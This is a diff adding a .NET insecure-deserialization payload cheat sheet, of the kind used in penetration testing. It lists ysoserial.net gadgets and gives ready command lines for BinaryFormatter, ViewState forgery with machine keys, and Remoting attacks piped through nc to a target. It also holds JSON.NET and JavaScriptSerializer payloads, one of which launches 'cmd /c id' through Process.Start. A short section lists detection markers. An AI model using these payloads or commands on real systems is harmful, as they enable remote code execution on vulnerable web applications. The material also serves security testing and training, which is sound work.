@@ -1,0 +1,68 @@
+# ============================================================
+# Insecure Deserialization — .NET
+# ============================================================
+
+# ---- .NET Serialization Formats ----
+# BinaryFormatter — most common, most dangerous
+# SoapFormatter
+# NetDataContractSerializer
+# DataContractSerializer (safe if configured)
+# XmlSerializer (safe if configured)
+# JavaScriptSerializer
+# Json.NET (Newtonsoft) — vulnerable with TypeNameHandling
+# LosFormatter (ViewState)
+
+# ---- ysoserial.net Gadgets ----
+# ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "id"
+ActivitySurrogateDisableTypeCheck
+ActivitySurrogateSelector
+ActivitySurrogateSelectorFromFile
+AxHostState
+BaseActivationFactory
+ClaimsIdentity
+ClaimsPrincipal
+DataSet
+DataSetOldBehaviourFromFile
+DataSetTypeSpoof
+GetterSettingsPropertyValue
+ObjectDataProvider
+ObjRef
+PSObject
+RolePrincipal
+SessionStateItemCollection
+TextFormattingRunProperties
+ToolboxItemContainer
+TypeConfuseDelegate
+TypeConfuseDelegateMono
+WindowsClaimsIdentity
+WindowsIdentity
+WindowsPrincipal
+XamlAssemblyLoadFromFile
+XmlSerializer
+
+# ---- ViewState Deserialization ----
+# .NET WebForms uses ViewState — base64 encoded, MAC-signed
+# If MAC validation disabled or key known:
+# ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "id" --plugin=ViewState --path=/page.aspx --apppath=/ --decryptionalg=AES --decryptionkey=KEY --validationalg=SHA1 --validationkey=KEY
+
+# ---- JSON.NET TypeNameHandling ----
+# Vulnerable if TypeNameHandling != None
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", "MethodName":"Start", "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c id"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
+
+# ---- JavaScriptSerializer ----
+# Abuses SimpleTypeResolver
+{"__type":"System.Web.UI.MobileControls.ArrayListCollectionBase, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a","InnerList":{"__type":"System.Web.Mobile.MobileCapabilities, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"}}
+
+# ---- Remoting TCP/IPC ----
+# .NET Remoting over TCP — binary formatter
+# ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "id" | nc target 9090
+
+# ---- Detection Points ----
+# __VIEWSTATE parameter
+# __EVENTVALIDATION parameter
+# Cookies containing base64 data with rO0AB (Java) or AAEAAAD (dotnet BinaryFormatter)
+# Headers: X-MicrosoftAjax:Delta=true
+
+# ---- MachineKey Sources (if needed for ViewState) ----
+# web.config: <machineKey validationKey="..." decryptionKey="..." />
+# Common default keys (search online for lists)
